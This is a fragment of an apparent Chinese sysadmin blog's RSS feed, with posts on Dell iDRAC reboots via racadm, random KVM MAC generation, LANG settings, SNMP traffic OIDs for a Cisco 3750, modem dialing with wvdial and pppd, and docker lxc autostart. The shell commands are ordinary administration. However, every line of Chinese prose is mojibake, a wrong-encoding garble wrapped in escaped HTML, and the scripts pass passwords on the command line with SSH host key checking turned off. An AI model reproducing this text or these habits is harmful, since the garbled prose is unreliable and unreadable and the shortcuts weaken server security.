&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sshpass -p &lt;span class=&#34;s2&#34;&gt;&amp;#34;xxxxxx&amp;#34;&lt;/span&gt; ssh -oStrictHostKeyChecking&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;no root@10.8.&lt;span class=&#34;nv&#34;&gt;$1&lt;/span&gt; racadm get System.LCD.CurrentDisplay  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä¸Šé¢è„šæœ¬ç”¨dellçš„radadmæ¥æŠ“å–æœåŠ¡å™¨idracçš„å‰é¢æ¿ä¿¡æ¯ï¼Œidracå’Œç½‘å¡çš„ç½‘æ®µåªæ˜¯å‰é¢ç¬¬ä¸€æ®µä¸åŒï¼Œç½‘å¡æ˜¯172ï¼Œidracæ˜¯10ï¼Œè¿™æ ·å¾ˆæ–¹ä¾¿è®°å¿†ã€‚&lt;/p&gt;
&lt;p&gt;å¾—åˆ°ç»“æœï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;CPU1 has internal error. &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;IERR&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å½»åº•å®Œè›‹ï¼CPUå‡ºé”™äº†ï¼Œæƒ³éƒ½ä¸ç”¨æƒ³ï¼Œç¡¬ä»¶é‡å¯ï¼š&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cat 3.reboot.sh  
#!/bin/sh
sshpass -p &amp;#34;xxxxxx&amp;#34; ssh -oStrictHostKeyChecking=no root@10.8.$1 racadm serveraction powercycle  
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ä»powercycleåˆ°Centoså®Œå…¨å¯åŠ¨ï¼Œç³»ç»Ÿå¼€å§‹è®°å½•/var/log/messagesï¼Œæ‰€æœ‰æ—¶é—´å…±èŠ±è´¹äº†7åˆ†é’Ÿã€‚&lt;/p&gt;
&lt;p&gt;æ³¨æ„ï¼šæœ‰å¯èƒ½åœ¨é‡å¯çš„è¿‡ç¨‹ä¸­éœ€è¦æŒ‰ä¸€ä¸‹F1çš„æŒ‰é’®ç»§ç»­ï¼Œè¿™æ ·å°±éœ€è¦æ‰“å¼€vncï¼ŒæŒ‰é‚£ä¸€ä¸‹å­ï¼Œæˆ–è€…æå‰åœ¨idracé‡Œè®¾ç½®ErrPrompt disabledï¼Œä¸éœ€è¦æŒ‰F1å°±é‡å¯ã€‚&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sshpass -p &lt;span class=&#34;s2&#34;&gt;&amp;#34;xxxxxx&amp;#34;&lt;/span&gt; ssh -oStrictHostKeyChecking&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;no root@10.8.&lt;span class=&#34;nv&#34;&gt;$1&lt;/span&gt; racadm &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; BIOS.MiscSettings.ErrPrompt Disabled  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ€»ç»“ï¼šè¿™èµ·æ•…éšœä»æ¥åˆ°æŠ¥è­¦åˆ°æ£€æŸ¥å®Œæ¯•åªèŠ±è´¹äº†3åˆ†é’Ÿï¼Œç„¶åé‡å¯ï¼Œ7åˆ†é’Ÿæœºå™¨ç³»ç»Ÿå¯åŠ¨ï¼Œ2åˆ†é’Ÿoracleå¤‡åº“æ¢å¤ï¼Œ3+7+2=12åˆ†é’Ÿã€‚è¿™çœŸæ˜¯ä¸ªæé™æ—¶é—´äº†ã€‚&lt;/p&gt;
&lt;p&gt;è¿ç»´èƒ½åšåˆ°çš„ä¹Ÿå°±è¿™ä¹ˆå¿«äº†å§ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>KVMä¸­ç½‘å¡åœ°å€éšæœºç”Ÿæˆæ–¹æ³•</title>
      <link>https://rendoumi.com/posts/20240109-kvm_random_mac/</link>
      <pubDate>Tue, 09 Jan 2024 10:05:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240109-kvm_random_mac/</guid>
      <description>&lt;p&gt;ç”¨bashéšæœºç”Ÿæˆç½‘å¡åœ°å€ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; 52:54:&lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;dd &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/dev/urandom &lt;span class=&#34;nv&#34;&gt;count&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; 2&amp;gt;/dev/null &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; md5sum &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; sed &lt;span class=&#34;s1&#34;&gt;&amp;#39;s/^\(..\)\(..\)\(..\)\(..\).*$/\1:\2:\3:\4/&amp;#39;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;52:54:f6:65:52:39  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¦ä¸€ç§åšæ³•ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;openssl rand -hex &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; sed &lt;span class=&#34;s1&#34;&gt;&amp;#39;s/\(..\)/\1:/g; s/.$//&amp;#39;&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>Linuxä¸‹è®¾ç½®LANGå˜é‡</title>
      <link>https://rendoumi.com/posts/20240109-linux_lang/</link>
      <pubDate>Tue, 09 Jan 2024 09:05:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240109-linux_lang/</guid>
      <description>&lt;p&gt;vim ç¼–è¾‘æ–‡ä»¶ï¼Œé‡Œé¢æ˜¯æœ‰ä¸­æ–‡çš„ï¼Œå¯æ˜¯ç¯å¢ƒå˜é‡ä¸­LANG=Cï¼Œéå¸¸ä¸ä¾¿å•Šï¼Œç»å¸¸å¾—export LANG=zh_CNæ¥è§£å†³ã€‚æ”¾åœ¨/etc/profileé‡Œä¹Ÿä¸æ˜¯ä¸ªäº‹ã€‚&lt;/p&gt;
&lt;p&gt;ä¸€åŠ³æ°¸é€¸çš„æ–¹æ³•ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# vi /etc/sysconfig/i18n&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;------
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;LANG&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;zh_CN.UTF-8&amp;#34;&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;SUPPORTED&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;zh_CN.UTF-8:zh_CN:zh:zh_TW.UTF-8:zh_TW:zh:en_US.UTF-8:en_US:en&amp;#34;&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;SYSFONT&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;latarcyrheb-sun16&amp;#34;&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;------
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>SNMP OIDæ¥ç›‘æ§ç½‘ç»œè®¾å¤‡æµé‡</title>
      <link>https://rendoumi.com/posts/20240108-snmp_network/</link>
      <pubDate>Mon, 08 Jan 2024 12:05:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240108-snmp_network/</guid>
      <description>&lt;p&gt;æƒ³è‡ªå·±ç”»å›¾æ¥ç›‘æ§äº¤æ¢æœºçš„æµé‡ï¼Œç¬¬ä¸€æ­¥å°±æ˜¯é€šè¿‡snmpwalkæ¥å¾—åˆ°äº¤æ¢æœºçš„è¿›å‡ºæµé‡ï¼š&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬ç”¨å¾—æ˜¯Cisco 3750çš„24å£äº¤æ¢æœºï¼Œç»™ä¸ªOIDè¡¨ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20240108142515825&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20240108-snmp_network/image-20240108142515825.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;å…ˆçœ‹ä¸€ä¸‹äº¤æ¢æœºçš„ç«¯å£æƒ…å†µï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;snmpwalk -v 2c -c xxxxxxxx 172.16.1.1 .1.3.6.1.2.1.2.2.1.2  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¾—åˆ°ä¸€å †ä¿¡æ¯ï¼Œé—®ç½‘ç»œå·¥ç¨‹å¸ˆå¾—åˆ°1/0/5å’Œ2/0/5è¿™ä¸¤ä¸ªç«¯å£æ˜¯åŒä¸Šè¿çº¿è·¯ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;IF-MIB::ifDescr.10105 &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; STRING: GigabitEthernet1/0/5  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;IF-MIB::ifDescr.10605 &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; STRING: GigabitEthernet2/0/5  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è®°ä½ä¸¤ä¸ªç«¯å£çš„æè¿°ç¬¦ï¼Œ10105å’Œ10605.&lt;/p&gt;
&lt;p&gt;ç»§ç»­ï¼Œæˆ‘ä»¬çœ‹ä¸Šè¡¨ï¼Œ.1.3.6.1.2.1.2.2.1.10(æ¥å£æ”¶åˆ°çš„å­—èŠ‚æ•°)ï¼Œæˆ‘ä»¬è¦å¾—åˆ°æŸä¸ªå…·ä½“ç«¯å£æ”¶åˆ°çš„å­—èŠ‚æ•°ï¼Œå°±å¿…é¡»åŠ ä¸Šç«¯å£çš„æè¿°ç¬¦äº†ã€‚æ‰€ä»¥è¦å¾—åˆ°1/0/5çš„æ”¶åˆ°å­—èŠ‚æ•°ï¼Œå°±æ˜¯.1.3.6.1.2.1.2.2.1.10.10105&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#snmpwalk -v 2c -c xxxxxxxx 172.16.1.1 .1.3.6.1.2.1.2.2.1.10.10105&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;IF-MIB::ifInOctets.10105 &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; Counter32: &lt;span class=&#34;m&#34;&gt;2198534228&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;okï¼Œæ‹¿åˆ°å­—èŠ‚æ•°äº†ï¼Œç„¶åå•ä½æ˜¯bytesï¼Œæ¢ç®—æˆbit(*8)ï¼Œç„¶åé™¤è‹¥å¹²1024ï¼Œå¾—åˆ°å•ä½mï¼Œg, tç­‰ï¼Œå…¥åº“ï¼Œç„¶åè°ƒhichartç”»å›¾å³å¯ã€‚&lt;/p&gt;
&lt;p&gt;ç„¶è€Œï¼Œè¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œçœ‹æ¸…ä¸Šé¢çš„å•ä½ï¼ŒCounter32ï¼Œå‘µå‘µï¼Œæ‰€ä»¥è¿™é‡Œæ˜¯ä¸å¯¹çš„ã€‚ç°å¦‚ä»Šçš„ç½‘ç»œå¤šæ˜¯åƒå…†ç½‘å¡äº†ï¼Œæ‰€ä»¥counter32æ˜¯ä¸å¯¹çš„, 100Mbpsä»¥ä¸Šå¿…é¡»ä½¿ç”¨Counter64çš„å•ä½ï¼Œç»™ä¸ªå¯¹ç…§è¡¨ï¼š&lt;/p&gt;
&lt;p&gt;é«˜é€Ÿç½‘å¡(100å…†ä»¥ä¸Šï¼‰:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ifHCInOctets: 1.3.6.1.2.1.31.1.1.1.6 (64-bit Octets in counter)&lt;/li&gt;
&lt;li&gt;ifHCOutOctets: 1.3.6.1.2.1.31.1.1.1.10 (64-bit Octets out counter)&lt;/li&gt;
&lt;li&gt;ifHCInUcastPkts:  1.3.6.1.2.1.31.1.1.1.7 (64-bit Packets in counter)&lt;/li&gt;
&lt;li&gt;ifHCOutUcastPkts:  1.3.6.1.2.1.31.1.1.1.11 (64-bit Packets out counter)&lt;/li&gt;
&lt;li&gt;ifHighSpeed: 1.3.6.1.2.1.31.1.1.1.15 (An estimate of the interface&amp;rsquo;s current bandwidth in units of 1Mbps)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ä½é€Ÿç½‘å¡ï¼š&lt;/p&gt;</description>
    </item>
    <item>
      <title>Linuxä¸‹é…ç½®Modemæ‹¨å·</title>
      <link>https://rendoumi.com/posts/20240108-modem_dial/</link>
      <pubDate>Mon, 08 Jan 2024 11:05:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240108-modem_dial/</guid>
      <description>&lt;p&gt;å…¬å¸ä¸ºäº†è·Ÿå»ºè®¾é“¶è¡Œå»ºç«‹ä¸“çº¿ï¼Œé¦–å…ˆç”¨ç”µè¯çº¿æ‹¨å·è¿›è¡Œæµ‹è¯•ã€‚ ä¹°å›æ¥ä¸€ä¸ªå¤–ç½®çš„Modemï¼Œæ¥åœ¨æœåŠ¡å™¨çš„com1å£ä¸Šï¼Œå…ˆç”¨ç”µè¯æµ‹è¯•ä¸€ä¸‹ï¼ŒOKæ²¡é—®é¢˜ï¼Œé‚£å°±ç»§ç»­é…modemæ‹¨å·&lt;/p&gt;
&lt;p&gt;Linuxä¸‹é…ç½®Modemæ‹¨å·æœ‰ä¸¤ç§æ–¹å¼ï¼Œä¼ ç»Ÿçš„pppdæ–¹å¼å’Œç®€å•çš„wvdialæ–¹å¼ã€‚&lt;/p&gt;
&lt;h2 id=&#34;ä¸€wvdialé…ç½®&#34;&gt;ä¸€ã€wvdialé…ç½®&lt;/h2&gt;
&lt;p&gt;wvdialçš„é…ç½®æ–¹æ³•è¶…çº§ç®€å•ï¼Œ
æ‰§è¡Œå‘½ä»¤ï¼š&lt;code&gt;wvdialconf /etc/wvdial.conf&lt;/code&gt;
å®ƒä¼šè‡ªåŠ¨æµ‹å‡ºç³»ç»Ÿçš„Modemï¼Œç¨å¾®ä¿®æ”¹ä¸€ä¸‹ï¼ŒåŠ å‡ ä¸ªå‚æ•°ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;vi /etc/wvdial.conf 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Dialer Defaults&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;Modem&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; /dev/ttyS0  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;Baud&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;115200&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;Init1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; ATZ  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;Init2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; ATQ0 V1 E1 &lt;span class=&#34;nv&#34;&gt;S0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;C1 &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;D2 +FCLASS&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;ISDN&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Auto &lt;span class=&#34;nv&#34;&gt;Reconnect&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; on  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Modem &lt;span class=&#34;nv&#34;&gt;Type&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; Analog Modem  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;Phone&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0,28929191  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;Username&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; ttt  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;Password&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; qqq  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¿™å°±å¼„å¥½äº†ï¼Œæ‰§è¡Œwvdail &amp;amp;å°±å¯ä»¥æ‹¨å·äº†ï¼Œç»“æŸä¹Ÿå¾ˆç®€å•ï¼Œkill -9 æ€æ‰wvdialå’Œppdè¿›ç¨‹å³å¯ã€‚&lt;/p&gt;
&lt;p&gt;æ³¨æ„ï¼šwvdial æ‹¨é€šåç³»ç»Ÿå¤šäº†ä¸€å—ç½‘å¡ppp0ï¼Œè·¯ç”±ä¿¡æ¯éƒ½æœªä¿®æ”¹ï¼Œä¸ºäº†èƒ½åˆ°è¾¾å»ºè¡Œçš„æœåŠ¡å™¨ï¼Œéœ€è¦ç¼–è¾‘/etc/ppp/ip-upæ–‡ä»¶ï¼ŒåŠ ä¸€å¥ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;route add -host 12.0.98.150 gw 12.0.98.236 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶åé‡æ‹¨pingä¸€ä¸‹ï¼Œping 12.0.98.150ï¼Œèƒ½pingé€šå°±è¯´æ˜okäº†ã€‚&lt;/p&gt;
&lt;h2 id=&#34;äºŒpppdé…ç½®&#34;&gt;äºŒã€pppdé…ç½®&lt;/h2&gt;
&lt;p&gt;wvdialéšè—äº†å¾ˆå¤šä¿¡æ¯ï¼Œæˆ‘ä»¬ä¸‹é¢ç”¨pppdæ¥çœ‹çœ‹çœŸå®çš„æ‹¨å·è¿‡ç¨‹å§ï¼š&lt;/p&gt;
&lt;p&gt;å…¶å®modemæ‹¨å·è®¤è¯çš„æ–¹å¼æœ‰ä¸¤ç§ï¼Œä¸€ç§æ˜¯æ˜¾ç¤ºæ˜æ–‡çš„login:(username:)æ–¹å¼ï¼Œå¦ä¸€ç§æ˜¯æ˜¾ç¤ºä¹±ç çš„pap(chap)æ–¹å¼ã€‚&lt;/p&gt;
&lt;p&gt;â‘ é¦–å…ˆï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;vi /etc/ppp/options  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;lock  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;crtscts  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;defaultroute  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;noauth  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;â‘¡æ¸…ç†ä¸€ä¸‹è€çš„è¿æ¥ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;killall pppd  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;rm /var/lock/LCK..ttyS0  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;â‘¢æ‰¾å‡ºè®¤è¯çš„æ–¹å¼ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/usr/sbin/pppd /dev/ttyS0 &lt;span class=&#34;m&#34;&gt;115200&lt;/span&gt; debug connect
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/usr/sbin/chat -v   &amp;#39;&amp;#39;   &amp;#39;AT&amp;amp;F0&amp;#39;   OK
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;ATD0,28929191   CONNECT   &amp;#39;dc&amp;#39; &amp;#34;&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;less /var/log/messages&lt;/p&gt;</description>
    </item>
    <item>
      <title>docker lxcç±»å‹å®¹å™¨è‡ªå¯åŠ¨ä»¥åŠè‡ªåŠ¨æ‰§è¡Œå‘½ä»¤</title>
      <link>https://rendoumi.com/posts/20240108-docker_lxc_startup/</link>
      <pubDate>Mon, 08 Jan 2024 10:05:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240108-docker_lxc_startup/</guid>
      <description>&lt;p&gt;æˆ‘ä»¬çš„å®¹å™¨é‡‡ç”¨çš„æ˜¯lxcç±»å‹ï¼Œä¸€æ˜¯ä¸ºäº†å›ºå®šipï¼ŒäºŒæ˜¯é¿å¼€iptableç±»å‹è½¬å‘çš„æ–¹å¼ã€‚å› ä¸ºæˆ‘ä»¬æ˜¯å¼ºç½‘ç»œç®¡ç†ç¯å¢ƒï¼Œç½‘ç»œå·¥ç¨‹å¸ˆå¯¹ç½‘ç»œçš„è§„åˆ’å’Œç®¡æ§éå¸¸å¼ºã€‚&lt;/p&gt;
&lt;p&gt;è¿™ç§æ–¹å¼ä¸‹å¯åŠ¨lxcå®¹å™¨å€’æ˜¯å¾ˆå¥½åŠï¼Œç›´æ¥ç¼–è¾‘/etc/rc.d/rc.local&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;docker start jko2o-16-13-49  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;docker start vis-16-13-51  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;docker start vis-16-13-50  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;docker start vis-16-13-48  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;docker start vis-16-13-47  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å°±å¯ä»¥å¼€æœºè‡ªåŠ¨å¯åŠ¨å®¹å™¨äº†ã€‚&lt;/p&gt;
